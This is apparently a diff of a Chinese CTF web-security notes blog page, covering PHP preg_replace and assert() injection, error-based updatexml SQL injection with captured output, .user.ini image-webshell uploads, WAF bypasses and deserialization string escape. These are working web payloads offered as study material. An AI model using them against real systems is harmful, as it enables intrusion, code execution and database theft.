@@ -100,7 +100,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2018-10-15</span>
-            <span class="time">21:11:41</span>
+            <span class="time">07:50:46</span>
           </span>
           
           <!--  Categories  -->
@@ -143,23 +143,10 @@
 &#125;</code></pre>
 
 <p>payload如下<br>1.把X-Forwarded-For换成127.0.0.1<br>2.<code>?pat=/test/e&amp;rep=phpinfo()&amp;sub=just test</code><br>pat是正则匹配模式，sub是字符串。rep是替换的内容<br><strong>php之assert()</strong></p>
-<p>bool assert(mixed $assertion[,string,$description])，如果assertion是字符串，他会被assert()当做php代码执行。 思路是通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码。<br>‘) or phpinfo();# ——即变成file_exists(‘’) or phpinfo();# ，结果为执行phpinfo()，注意要url编码，本处为了方便阅读，以编码前显示<br>‘) or print_r(file_get_contents(‘templates/flag.php’);# ——然后在源代码里（临门一脚不要被坑了） 即最终payload:?page=’)%20or%20print_r(file_get_contents(‘templates%2fflag.php’))%3b%23<br><strong>文件泄漏</strong><br>.rar   .zip  .7z   .tar.gz   .bak    .swp   .txt   .sql<br>##sql注入<br>报错注入<br>select concat(floor(rand(0)<em>2),”======”,(查询语句)) as xx，count(1),3 from xxx group by xx#<br>其中的一个万能密码，如果数据库中存在比较<br><code>if(md5($pw)==$password)</code><br>如果查询的回显值select 1,2,3#,其中1的字段为id,2的字段为user,3的字段为password，那我们就可以通过构造字符串来绕过比较得到flag，例如<br><code>pw=123//这个是我们自己构造的</code><br>`/*那么可以构造sql语句,查询123的md5,通过字符串的方式写入sql语句，那么sql后台会返给这个语句给php,md5($pw)和$password比较,前提这个第二个字段的user一定要传对,一定是正确的用户名</em>/<code>**sql注入 updatexml**
-UPDATEXML (XML_document, XPath_string, new_value); 
-第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 
-第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 
-第三个参数：new_value，String格式，替换查找到的符合条件的数据 
-作用：改变文档中符合条件的节点的值
-然后咱们再看看语句：</code><a href="http://www.XXXIII.com/a.php?id=1" target="_blank" rel="noopener">http://www.XXXIII.com/a.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)<code>CONCAT(str1,str2,…)  
-返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。
-通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。
-错误大概会是：</code>ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’`<br>例如最近的北京工业的比赛，一道sql注入</p>
-<pre><code class="hljs undefined"># 爆数据库 http://<span class="hljs-number">172.21</span><span class="hljs-number">.4</span><span class="hljs-number">.12</span>:<span class="hljs-number">10012</span>/search.php?name=admin%df%<span class="hljs-number">27</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">1</span>,database()),<span class="hljs-number">1</span>) <span class="hljs-comment">--+&amp;pw=y1ng</span>
-# Error: XPATH syntax <span class="hljs-built_in">error</span>: <span class="hljs-string">'web_sqli'</span>
-# 查表名
-http://<span class="hljs-number">172.21</span><span class="hljs-number">.4</span><span class="hljs-number">.12</span>:<span class="hljs-number">10012</span>/search.php?name=admin%df%<span class="hljs-number">27</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">1</span>, (seSELECTlect group_concat(table_name) from information_schema.tables whWHEREere table_schema=database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>) <span class="hljs-comment">--+&amp;pw=y1ng</span>
-# Error: XPATH syntax <span class="hljs-built_in">error</span>: <span class="hljs-string">'f14g,user'</span></code></pre>
-
-<h1 id="HCTF"><a href="#HCTF" class="headerlink" title="HCTF"></a>HCTF</h1><pre><code class="hljs undefined"><span class="hljs-variable">$_page</span> = urldecode(<span class="hljs-variable">$page</span>);
+<p>bool assert(mixed $assertion[,string,$description])，如果assertion是字符串，他会被assert()当做php代码执行。 思路是通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码。<br>‘) or phpinfo();# ——即变成file_exists(‘’) or phpinfo();# ，结果为执行phpinfo()，注意要url编码，本处为了方便阅读，以编码前显示<br>‘) or print_r(file_get_contents(‘templates/flag.php’);# ——然后在源代码里（临门一脚不要被坑了） 即最终payload:?page=’)%20or%20print_r(file_get_contents(‘templates%2fflag.php’))%3b%23<br><strong>文件泄漏</strong><br>.rar   .zip  .7z   .tar.gz   .bak    .swp   .txt   .sql<br>##sql注入<br>报错注入<br>select concat(floor(rand(0)乘2),”======”,(查询语句)) as xx，count(1),3 from xxx group by xx<br>函数报错注入<br>1=(updatexml(1,concat(0x3a,(查询语句)),1))<br>其中的一个万能密码，如果数据库中存在比较<br><code>if(md5($pw)==$password)</code><br>如果查询的回显值select 1,2,3#,其中1的字段为id,2的字段为user,3的字段为password，那我们就可以通过构造字符串来绕过比较得到flag，例如<br><code>pw=123//这个是我们自己构造的</code><br><code>/*那么可以构造sql语句,查询123的md5,通过字符串的方式写入sql语句，那么sql后台会返给这个语句给php,md5($pw)和$password比较,前提这个第二个字段的user一定要传对,一定是正确的用户名*/</code></p>
+<h1 id="sql注入-updatexml"><a href="#sql注入-updatexml" class="headerlink" title="sql注入 updatexml"></a>sql注入 updatexml</h1><p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>然后咱们再看看语句：<br><code>http://www.XXXIII.com/a.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code><br>CONCAT(str1,str2,…)<br>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。<br>通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。<br>错误大概会是：<br><code>ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’</code><br>例如最近的北京工业的比赛，一道sql注入</p>
+<h1 id="爆数据库-http-172-21-4-12-10012-search-php-name-admin-df-27-and-updatexml-1-concat-1-database-1-–-amp-pw-y1ng"><a href="#爆数据库-http-172-21-4-12-10012-search-php-name-admin-df-27-and-updatexml-1-concat-1-database-1-–-amp-pw-y1ng" class="headerlink" title="爆数据库 http://172.21.4.12:10012/search.php?name=admin%df%27 and updatexml(1,concat(1,database()),1) –+&amp;pw=y1ng"></a>爆数据库 <a href="http://172.21.4.12:10012/search.php?name=admin%df%27" target="_blank" rel="noopener">http://172.21.4.12:10012/search.php?name=admin%df%27</a> and updatexml(1,concat(1,database()),1) –+&amp;pw=y1ng</h1><h1 id="Error-XPATH-syntax-error-‘web-sqli’"><a href="#Error-XPATH-syntax-error-‘web-sqli’" class="headerlink" title="Error: XPATH syntax error: ‘web_sqli’"></a>Error: XPATH syntax error: ‘web_sqli’</h1><h1 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h1><p><a href="http://172.21.4.12:10012/search.php?name=admin%df%27" target="_blank" rel="noopener">http://172.21.4.12:10012/search.php?name=admin%df%27</a> and updatexml(1,concat(1, (seSELECTlect group_concat(table_name) from information_schema.tables whWHEREere table_schema=database() limit 0,1)),1) –+&amp;pw=y1ng</p>
+<h1 id="Error-XPATH-syntax-error-‘f14g-user’"><a href="#Error-XPATH-syntax-error-‘f14g-user’" class="headerlink" title="Error: XPATH syntax error: ‘f14g,user’"></a>Error: XPATH syntax error: ‘f14g,user’</h1><h1 id="HCTF"><a href="#HCTF" class="headerlink" title="HCTF"></a>HCTF</h1><pre><code class="hljs undefined"><span class="hljs-variable">$_page</span> = urldecode(<span class="hljs-variable">$page</span>);
             <span class="hljs-variable">$_page</span> = mb_substr(
                 <span class="hljs-variable">$_page</span>,
                 0,
@@ -199,7 +186,10 @@ in_array 中的 <span class="hljs-variable">_page</span> 为 <span class="hljs-b
 
 上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</span></code></pre>
 
-<p>当我们给定一个参数时,num会有waf,所以我可以在num前面加个空格,解析时是一样的,然后可以在后面执行系统语句<br>当执行到当前目录时,有的会绕过所以我们可以用acsii码绕过<br>scandir(“/“),但是“/”被过滤了，所以我们用chr(“47”)绕过,发现flagg文件</p>
+<pre><code class="hljs undefined">当我们给定一个参数时,num会有waf,所以我可以在num前面加个空格,解析时是一样的,然后可以在后面执行系统语句
+当执行到当前目录时,有的会绕过所以我们可以用acsii码绕过
+<span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">(<span class="hljs-string">"/"</span>)</span></span>,但是“/”被过滤了，所以我们用chr(“<span class="hljs-number">47</span>”)绕过,发现flagg文件</code></pre>
+
 <h1 id="burpsiute不断发包"><a href="#burpsiute不断发包" class="headerlink" title="burpsiute不断发包"></a>burpsiute不断发包</h1><p>这个一开始是我的知识盲区,其实就是普通的攻击模块不设payloads而已,具体步骤如下<br>首先我们需要把所有的payload清除<br><img src="https://img-blog.csdnimg.cn/2020012015304978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="1"><br>然后设置攻击模式为null payloads<br>payload options设为continue indefinitely<br><img src="https://img-blog.csdnimg.cn/20200120153354950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="2"><br>最后设置线程,这个是最重要的否则会造成dos<br>number of threads 设为1<br>throttle设为2500 也就是2.5s发一个<br><img src="https://img-blog.csdnimg.cn/20200120153524533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="3"></p>
 <h1 id="user-ini-checkin"><a href="#user-ini-checkin" class="headerlink" title=".user.ini(checkin)"></a>.user.ini(checkin)</h1><p>这道题运用的是.user.ini这个和.hatacess是一个性质,都是为了将上传的图片马转换为php代码解析<br>还有一个小知识点绕过php的exif_imagetype()函数，这个很好绕过，添加图片文件头就可以了<br><code>GIF98a</code><br>如果.hatacess无效的话用如下<br>大致意思就是:我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php),类似于在index.php中插入一句：require(./a.jpg);<br>而user.ini的应用环境如下<br>    服务器脚本语言为PHP<br>    服务器使用CGI／FastCGI模式<br>    上传目录下要有可执行的php文件<br>代码如下<br><code>GIF89a
 auto_prepend_file=a.jpg</code><br>对方服务器一定要有php代码才能执行<br>再将a.jpg上传<br>`GIF89a</p>
@@ -218,6 +208,25 @@ curl_close($ch);
 ?&gt;</code></pre>
 
 <h1 id="java文件泄露-java-特有的-遇见java可以尝试"><a href="#java文件泄露-java-特有的-遇见java可以尝试" class="headerlink" title="java文件泄露(java 特有的 遇见java可以尝试)"></a>java文件泄露(java 特有的 遇见java可以尝试)</h1><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：<br> /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br>    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>    /WEB-INF/database.properties：数据库配置文件<br>get 请求不到 就用post请求</p>
+<h1 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h1><p>首先为了逃过get或post参数的长度限制(正则表达式) 可以传数组<br>反序列化逃逸是什么呢 可以通过构造语句来改变序列化参数的值<br>一道ctf为例,我们要改photo的值,使其指向flag.php<br>首先简单介绍反序列化<br>序列化</p>
+<pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>
+$a = <span class="hljs-keyword">array</span>(<span class="hljs-string">'123'</span>, <span class="hljs-string">'abc'</span>, <span class="hljs-string">'hu'</span>);
+var_dump(serialize($a));
+<span class="hljs-meta">?&gt;</span></span></code></pre>
+
+<p>结果<br><code>string(49) &quot;a:3:{i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:2:&quot;hu&quot;;}&quot;</code><br>反序列化</p>
+<pre><code class="hljs undefined">&lt;?php
+<span class="hljs-regexp">//</span><span class="hljs-variable">$a</span> = array(<span class="hljs-string">'123'</span>, <span class="hljs-string">'abc'</span>, <span class="hljs-string">'hu'</span>);
+<span class="hljs-regexp">//</span>var_dump(serialize(<span class="hljs-variable">$a</span>));
+<span class="hljs-regexp">//</span><span class="hljs-string">"a:3:&#123;i:0;s:3:"</span><span class="hljs-number">123</span><span class="hljs-string">";i:1;s:3:"</span>abc<span class="hljs-string">";i:2;s:2:"</span>h<span class="hljs-string">u";&#125;"</span>
+<span class="hljs-variable">$b</span> = <span class="hljs-string">'a:3:&#123;i:0;s:3:"123";i:1;s:3:"abc";i:2;s:2:"hu";&#125;'</span>;
+var_dump(unserialize(<span class="hljs-variable">$b</span>));
+?&gt;</code></pre>
+
+<p>结果<br><code>array(3) { [0]=&gt; string(3) &quot;123&quot; [1]=&gt; string(3) &quot;abc&quot; [2]=&gt; string(2) &quot;hu&quot; }</code><br>其实我们可以构造”;}<br>  我们把第二个值abc换成abc”;i:2;s:5:”qwert”* ;}<br><code>array(3) { [0]=&gt; string(3) &quot;123&quot; [1]=&gt; string(3) &quot;abc&quot; [2]=&gt; string(4) &quot;defg&quot; }</code><br>那么之后的hu就被遗弃了<br>那么怎么让qwert被逃逸呢 注意遗弃和逃逸不一样 逃逸还能被识别<br>我们可以在前面的长度动手脚 前面增加的长度等于后面的逃逸长度<br>例如要逃逸如下代码 长度为33<br><code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;flag.php&quot;;}</code><br>那么前面的s就要增加33位,如题所示(0CTF 2016]piapiapia)<br>where select一些敏感字会被替换成hacker 那我们就多加33个where<br>增加s的数量=33乘hacker 因为是被替换的<br>33个where+”;s:5:”photo”;s:10:”flag.php”;} photo就会被解析成flag.php<br>但此题有些小技巧</p>
+<pre><code class="hljs undefined">之前我传入的是";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:"photo"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:"flag.php"</span>;&#125;结果失败了，看了网上的一些文章，发现他们传入的是";&#125;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:"photo"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:"flag.php"</span>;&#125;为什么前面要多加一个&#125;，后来发现是因为我们<span class="hljs-selector-tag">nickname</span>构造成了数组，而不是字符，所以要加&#125;闭合一下。</code></pre>
+
+<p>所以是34个where</p>
 
         </div>
       </div>
